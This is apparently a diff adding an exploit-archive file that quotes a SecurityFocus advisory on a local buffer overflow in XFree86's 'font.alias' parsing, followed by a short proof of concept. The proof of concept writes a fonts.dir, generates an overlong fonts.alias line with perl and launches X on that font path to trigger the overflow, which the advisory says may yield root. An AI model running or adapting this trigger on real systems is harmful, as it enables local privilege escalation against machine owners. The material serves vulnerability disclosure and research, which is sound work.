@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/9652/info
+
+It has been reported that the XFree86 X Windows system is prone to a local buffer overflow vulnerability. The issue arises from improper bounds checking when parsing the 'font.alias' file. Successful exploitation of this issue may allow an attacker to gain root privileges to the affected system.
+
+# cat > fonts.dir <<EOF 
+1
+word.bdf -misc-fixed-medium-r-semicondensed--13-120-75-75-c-60-iso8859-1
+EOF
+# perl -e 'print "data " . "0" x 2048 . "A" x 96 . "\n"' > fonts.alias
+# X :0 -fp $PWD
